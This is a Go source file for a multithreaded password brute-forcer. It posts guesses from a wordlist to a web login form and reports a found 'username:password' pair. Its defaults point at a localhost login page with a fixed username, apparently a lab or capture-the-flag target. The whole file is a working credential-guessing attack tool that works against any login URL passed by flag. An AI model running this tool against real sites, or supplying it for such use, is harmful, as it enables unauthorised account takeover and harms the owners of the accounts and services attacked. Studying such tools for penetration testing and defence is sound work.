package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/thomas-osgood/OGOR/misc/generators"
	"github.com/thomas-osgood/OGOR/output"
)

type Bruter struct {
	TargetURL    string
	IncorrectMsg string
	Wordlist     string

	nthreads  int
	commsChan chan string
	stopChan  chan bool
	username  string
	waitgroup sync.WaitGroup
}

var printer *output.Outputter
var wlreader *generators.WordlistGenerator

func (b *Bruter) BruteTarget() (password string, err error) {
	var i int = 0

	password = ""
	wlreader.CommsChan = b.commsChan

	go wlreader.ReadWordlist()

	for i = 0; i < b.nthreads; i++ {
		b.waitgroup.Add(1)
		go b.worker(&password)
	}

	b.waitgroup.Wait()

	wlreader.StopRead = true

	if len(password) < 1 {
		return "", fmt.Errorf("password not found")
	}

	return password, nil
}

func (b *Bruter) testPassword(password string) (err error) {
	var bodybytes []byte
	var client *http.Client = http.DefaultClient
	var resp *http.Response
	var postData url.Values = url.Values{}

	client.Timeout = 10 * time.Second

	postData.Set("username", b.username)
	postData.Set("password", password)

	printer.SysMsgNB(fmt.Sprintf("testing \"%s\"", password))

	resp, err = client.PostForm(b.TargetURL, postData)
	if err != nil {
		return err
	} else if resp.StatusCode >= http.StatusBadRequest {
		return err
	}
	defer resp.Body.Close()

	bodybytes, err = io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	if strings.Contains(string(bodybytes), b.IncorrectMsg) {
		return fmt.Errorf("password incorrect")
	}

	return nil
}

func (b *Bruter) worker(password *string) {
	defer b.waitgroup.Done()

	var currentPassword string
	var err error

	for currentPassword = range b.commsChan {
		select {
		case <-b.stopChan:
			return
		default:
			err = b.testPassword(currentPassword)
			if err == nil {
				*password = currentPassword
				close(b.stopChan)
			}
		}
	}
}

func init() {
	var err error

	printer, err = output.NewOutputter()
	if err != nil {
		log.Fatalf(err.Error())
	}
}

func main() {
	var bruter Bruter
	var err error
	var password string

	flag.StringVar(&bruter.TargetURL, "u", "http://127.0.0.1/login-post/index.php", "full path to login page")
	flag.StringVar(&bruter.Wordlist, "w", "postlist.lst", "wordlist to use for brute-force")
	flag.StringVar(&bruter.IncorrectMsg, "i", "Incorrect username or password", "message indicating failed login")
	flag.IntVar(&bruter.nthreads, "t", 20, "number of threads to use")
	flag.StringVar(&bruter.username, "n", "burgess", "username to test")
	flag.Parse()

	wlreader, err = generators.NewWordlistGenerator(bruter.Wordlist)
	if err != nil {
		printer.ErrMsg(err.Error())
		return
	}

	bruter.commsChan = make(chan string)
	bruter.stopChan = make(chan bool)

	printer.PrintChar('-', 60)
	printer.CenterString("Information", 60)
	printer.PrintChar('-', 60)
	printer.InfMsg(fmt.Sprintf("Target: %s", bruter.TargetURL))
	printer.InfMsg(fmt.Sprintf("Username: %s", bruter.username))
	printer.InfMsg(fmt.Sprintf("Wordlist: %s", bruter.Wordlist))
	printer.InfMsg(fmt.Sprintf("Threads: %d", bruter.nthreads))
	printer.PrintChar('-', 60)

	password, err = bruter.BruteTarget()
	if err != nil {
		printer.ErrMsg(err.Error())
		return
	}
	printer.SucMsg(fmt.Sprintf("%s:%s", bruter.username, password))

}

